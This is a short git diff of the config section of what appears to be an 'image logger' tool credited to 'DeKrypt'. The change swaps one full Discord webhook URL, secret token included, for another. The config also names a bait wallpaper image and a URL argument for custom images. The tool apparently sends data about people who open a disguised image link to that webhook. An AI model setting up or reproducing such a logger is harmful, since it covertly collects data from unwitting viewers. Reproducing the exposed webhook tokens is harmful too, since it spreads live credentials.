@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1337067769539198986/qpdq6GfiI15_H-o1vhRQ_E_f5FGdQRleLLwB3tlUejXvFJFoWSJWF_ifqD_yVU-hmeSb",
+    "webhook": "https://discord.com/api/webhooks/1337993157635215412/CVGDhlQMnjpTTxvtbP_Tqx76HyDHvhzwnW92JKzeryE9H4vDWjf_Tc2CYyaEnRn2Rsmr",
     "image": "https://wallpapers.com/images/hd/spiderman-background-oycfyb1ksermw921.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
